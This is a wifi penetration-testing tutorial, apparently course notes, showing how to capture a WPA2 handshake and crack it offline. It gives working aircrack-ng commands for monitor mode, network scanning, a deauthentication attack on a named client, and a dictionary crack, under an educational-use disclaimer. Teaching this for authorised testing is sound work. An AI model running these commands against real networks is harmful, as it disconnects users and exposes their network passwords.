Tutorial on hacking wireless access points to include capture handshakes and crackings .cap files.

----------

Legal Usage: The information provided by execute@will is to be used for educational purposes only. The website creator and/or editor is in no way responsible for any misuse of the information provided. All the information on this website is meant to help the reader develop penetration testing and vulnerability aptitude to prevent attacks discussed. In no way should you use the information to cause any kind of damage directly or indirectly. Information provided by this website is to be regarded from an “ethical hacker” standpoint. Only preform testing on systems you OWN and/or have expressed written permission. Use information at your own risk.

By continued reading, you acknowledge the aforementioned user risks/responsibilities.

----------

Based off TheCyberMentor amazing Udemy course available at [https://www.udemy.com/course/practical-ethical-hacking/](https://www.udemy.com/course/practical-ethical-hacking/)

# Wifi Pentesting Overview
**Types Wireless Security:**
WPA2 Pre Share Key (PSK) - “Everyday” seen security across wireless networks
WPA2 Enterprise - Utilize Radius Servers/Credentials (advanced environments)

**Evaluating Networks:**

- Evaluating strength of PSK
- Reviewing nearby network
- Assessing guest networks
- Checking network access

Tools used for Assessments:

- Wireless Cards - Alfa AWUD036NH
- Router
- Laptop

**The Process / Methodology**

![](https://paper-attachments.dropbox.com/s_0ECD1307AB8B03CAC9E54C16CBE9A470FE8843DA70DE01018AE4AC666B1B929A_1578149236145_image.png)



# Attacking Wireless Networks


- Relys on poor password on wireless networks
- After a WPA hand shake

## Setup Wireless Card on Kali
    iwconfig

![](https://paper-attachments.dropbox.com/s_0ECD1307AB8B03CAC9E54C16CBE9A470FE8843DA70DE01018AE4AC666B1B929A_1578149482736_image.png)


 
 ## Place wireless card into monitor mode

- kill process that would interfere with the wireless network
    airmong-ng check kill

![](https://paper-attachments.dropbox.com/s_0ECD1307AB8B03CAC9E54C16CBE9A470FE8843DA70DE01018AE4AC666B1B929A_1578149575514_image.png)



## Start monitor mode

    airmon-ng start wlan0

![](https://paper-attachments.dropbox.com/s_0ECD1307AB8B03CAC9E54C16CBE9A470FE8843DA70DE01018AE4AC666B1B929A_1578149735588_image.png)


changing modes from `wlan0`  to `[phy1]wlan0mon`.

confirm with `iwconfig`

![](https://paper-attachments.dropbox.com/s_0ECD1307AB8B03CAC9E54C16CBE9A470FE8843DA70DE01018AE4AC666B1B929A_1578149801362_image.png)



## Searching nearby area of wifi networks

    airodump-ng wlan0mon

![](https://paper-attachments.dropbox.com/s_0ECD1307AB8B03CAC9E54C16CBE9A470FE8843DA70DE01018AE4AC666B1B929A_1578150001126_image.png)


*devices are populating in the list.*


- The lower the PWR is the closer you are to the device

`ctrl+c` as we identifed the TP-Link to attack:

![](https://paper-attachments.dropbox.com/s_0ECD1307AB8B03CAC9E54C16CBE9A470FE8843DA70DE01018AE4AC666B1B929A_1578150088860_image.png)


## Narrow the wifi network down via airodump-ng

    airodump-ng -c 6 --bssid 50:C7:BF:8A:00:73 -w capture wlan0mon

-w = name of file

![](https://paper-attachments.dropbox.com/s_0ECD1307AB8B03CAC9E54C16CBE9A470FE8843DA70DE01018AE4AC666B1B929A_1578150218295_image.png)


if this was a larger network we would see more devices. 

## Performing a DEAUTH attack

- within a new window
- might need to run the attack several times to get the deauth
    aireplay-ng -0 1 -a 50:C7:BF:8A:00:73 -c 3C:F0:11:22:DB:E3 wlan0mon

-a = Wifi mac address
-c = Station (client)

![](https://paper-attachments.dropbox.com/s_0ECD1307AB8B03CAC9E54C16CBE9A470FE8843DA70DE01018AE4AC666B1B929A_1578150477336_image.png)


Beacon rate began to increase which then led to the “WPA handshake”

## Viewing captured data 

![](https://paper-attachments.dropbox.com/s_0ECD1307AB8B03CAC9E54C16CBE9A470FE8843DA70DE01018AE4AC666B1B929A_1578150613088_image.png)


## Cracking the captured data

    aircrack-ng -w wordlist.txt -b 50:C7:BF:8A:00:73 capture-02.cap

-b = MAC address of target router

![](https://paper-attachments.dropbox.com/s_0ECD1307AB8B03CAC9E54C16CBE9A470FE8843DA70DE01018AE4AC666B1B929A_1578150767089_image.png)


*Passphrase was discovered quite quickly in this case.*

